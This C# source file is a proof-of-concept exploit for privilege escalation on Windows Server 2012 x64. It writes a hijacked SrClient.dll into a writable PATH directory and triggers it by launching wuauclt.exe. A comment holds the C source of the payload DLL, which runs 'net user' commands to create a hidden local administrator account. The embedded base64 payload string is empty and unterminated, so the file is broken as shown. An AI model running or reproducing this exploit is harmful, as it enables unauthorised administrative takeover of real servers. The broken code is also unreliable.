using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.AccessControl;
using System.Security.Principal;

// https://blog.vonahi.io/srclient-dll-hijacking/?test=test

namespace SrClient
{
    class Program
    {
        static void Main(string[] args)
        {

            PrintBanner();

            if (!CheckOS())
            {
                PrintRed("[-] Server is not Windows Server 2012 x64");
                Console.ResetColor();
                Console.WriteLine();
                return;
            }

            /* DLL to create user Privesc / Pr!v35c with local admin privileges
            
            $ cat cmd.c

            #include <windows.h>
            BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
                if (dwReason == DLL_PROCESS_ATTACH){
                    WinExec("cmd.exe /c net user Privesc Pr!v35c /add", 0);
                    WinExec("cmd.exe /c net localgroup administrators Privesc /add", 0);
                    ExitProcess(0);
                }
                return TRUE;
            }
 
            $ x86_64-w64-mingw32-gcc cmd.c -shared -s -Os -o cmd.dll
            $ base64 -w 0 cmd.dll

            */

            string cmd = "
            Byte[] bytes = Convert.FromBase64String(cmd);

            string[] directories = GetPath().Split(';');
            int counter = 0;
            Console.WriteLine("[~] Checking PATH for writable directories with current privileges");
            foreach (string directory in directories)
            {
                if (DirectoryHasPermission(directory, FileSystemRights.WriteData) is true)
                {
                    PrintGreen(" |_[+] " + directory + " is writable");
                    counter += 1;
                    string dir = directory;
                    if (!directory.EndsWith("\\"))
                    {
                        dir += "\\";
                    }
                    try
                    {
                        Console.WriteLine("    |_[~] Attempting to write DLL to this location");
                        File.WriteAllBytes(dir + "SrClient.dll", bytes);
                        PrintGreen("    |_[+] Successfully wrote DLL to " + dir + "SrClient.dll");
                        break;
                    }
                    catch (Exception e)
                    {
                        PrintRed(e.ToString());
                    }
                }
                else
                {
                    PrintRed(" |_[-] " + directory + " is not writable");
                }
            }

            if (counter == 0)
            {
                PrintRed("[-] No writable directory was found");
                return;
            }

            Console.WriteLine("[~] Attempting to trigger TiWorker.exe");

            if (Process.Start("C:\\Windows\\System32\\wuauclt.exe", "/DetectNow") != null) // stealthy
            {
                PrintGreen("[+] Successfully ran wuauclt.exe");
            }

            Console.WriteLine();
            PrintYellow("[?] If TiWorker.exe did not trigger, you can manually trigger it through the control panel or wait for it to automatically run");

            Console.WriteLine();
            return;
        }

        /* Retrieve the PATH variable content */
        static string GetPath()
        {
            return System.Environment.GetEnvironmentVariable("PATH");
        }

        /* Retrieve AccessRight over a DirectoryPath for the current user */
        public static bool DirectoryHasPermission(string DirectoryPath, FileSystemRights AccessRight)
        {
            if (string.IsNullOrEmpty(DirectoryPath)) return false;

            try
            {
                AuthorizationRuleCollection rules = Directory.GetAccessControl(DirectoryPath).GetAccessRules(true, true, typeof(System.Security.Principal.SecurityIdentifier));
                WindowsIdentity identity = WindowsIdentity.GetCurrent();

                foreach (FileSystemAccessRule rule in rules)
                {
                    if (identity.Groups.Contains(rule.IdentityReference))
                    {
                        if ((AccessRight & rule.FileSystemRights) == AccessRight)
                        {
                            if (rule.AccessControlType == AccessControlType.Allow)
                                return true;
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        /* Check if OS is Windows Server 2012 x64
         
        +------------------------------------------------------------------------------+
        |                    |   PlatformID    |   Major version   |   Minor version   |
        +------------------------------------------------------------------------------+
        | Windows 95         |  Win32Windows   |         4         |          0        |
        | Windows 98         |  Win32Windows   |         4         |         10        |
        | Windows Me         |  Win32Windows   |         4         |         90        |
        | Windows NT 4.0     |  Win32NT        |         4         |          0        |
        | Windows 2000       |  Win32NT        |         5         |          0        |
        | Windows XP         |  Win32NT        |         5         |          1        |
        | Windows 2003       |  Win32NT        |         5         |          2        |
        | Windows Vista      |  Win32NT        |         6         |          0        |
        | Windows 2008       |  Win32NT        |         6         |          0        |
        | Windows 7          |  Win32NT        |         6         |          1        |
        | Windows 2008 R2    |  Win32NT        |         6         |          1        |
        | Windows 8          |  Win32NT        |         6         |          2        |
        | Windows 8.1        |  Win32NT        |         6         |          3        |
        +------------------------------------------------------------------------------+
        | Windows 10         |  Win32NT        |        10         |          0        |
        +------------------------------------------------------------------------------+     
                
        */

        public static bool CheckOS()
        {
            OperatingSystem os = Environment.OSVersion;
            bool is64bit = Environment.Is64BitOperatingSystem;
            if (os.Platform.ToString() == "Win32NT" && os.Version.ToString().Split('.')[0] == "6" && IsServerOS() && is64bit)
            {
                return true;
            }
            return false;
        }

        /* Check if OS is a server */
        public static bool IsServerOS()
        {
            return IsServerOS(Environment.MachineName);
        }

        public static bool IsServerOS(string computerName)
        {
            ConnectionOptions options = new ConnectionOptions() { EnablePrivileges = true, Impersonation = ImpersonationLevel.Impersonate };
            ManagementScope scope = new ManagementScope(string.Format(@"\\{0}\root\CIMV2", computerName), options);
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");

            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
            using (ManagementObjectCollection results = searcher.Get())
            {
                if (results.Count != 1) throw new ManagementException();

                uint productType = (uint)results.OfType<ManagementObject>().First().Properties["ProductType"].Value;

                switch (productType)
                {
                    case 1:
                        return false;
                    case 2:
                        return true;
                    case 3:
                        return true;
                    default:
                        throw new ManagementException();
                }
            }
        }

        /* Print functions */
        public static void PrintGreen(string input)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(input);
            Console.ResetColor();
        }

        public static void PrintRed(string input)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(input);
            Console.ResetColor();
        }

        public static void PrintYellow(string input)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(input);
            Console.ResetColor();
        }

        public static void PrintBanner()
        {
            Console.WriteLine();
            string banner = "-=[ Server 2012 x64 - PATH SrClient.dll hijack ]=-";
            Console.WriteLine(String.Format("{0," + ((Console.WindowWidth / 2) + (banner.Length / 2)) + "}", banner));
            banner = "-= Discovery by @WynterErik =-";
            Console.WriteLine(String.Format("{0," + ((Console.WindowWidth / 2) + (banner.Length / 2)) + "}", banner));
            banner = "-= PoC by @aikarifb =-";
            Console.WriteLine(String.Format("{0," + ((Console.WindowWidth / 2) + (banner.Length / 2)) + "}", banner));
            Console.WriteLine();
        }
    }
}
